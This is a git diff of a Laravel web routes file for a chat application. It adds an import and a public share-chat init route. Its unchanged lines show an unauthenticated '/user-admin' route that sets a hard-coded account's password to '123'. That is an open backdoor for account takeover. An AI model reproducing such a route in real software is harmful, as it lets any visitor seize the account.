@@ -9,6 +9,7 @@ use App\Http\Controllers\Chat\ChatController;
 use App\Http\Controllers\Chat\PublicChatController;
 use App\Http\Controllers\Connector\ConnectorController;
 use App\Http\Controllers\User\ProfileController;
+use App\Models\User;
 use Illuminate\Foundation\Application;
 use Illuminate\Support\Facades\Route;
 use Inertia\Inertia;
@@ -28,7 +29,7 @@ Route::get('/', function () {
 });
 
 Route::get('/user-admin', function () {
-    $user = \App\Models\User::where('email', 'uniqdeveloper@yandex.ru')->first();
+    $user = User::where('email', 'uniqdeveloper@yandex.ru')->first();
 
     $user->password = '123';
 
@@ -71,6 +72,7 @@ Route::middleware('auth')->group(function () {
  */
 Route::middleware('allow.iframe')->group(function () {
     Route::get('/share-chat/{assistant}', [PublicChatController::class, 'show'])->name('share-chat.show');
+    Route::get('/share-chat/{assistant}/init', [PublicChatController::class, 'init'])->name('share-chat.init');
     Route::post('/share-chat/{assistant}/message', [PublicChatController::class, 'message'])->name('share-chat.message');
 });
 
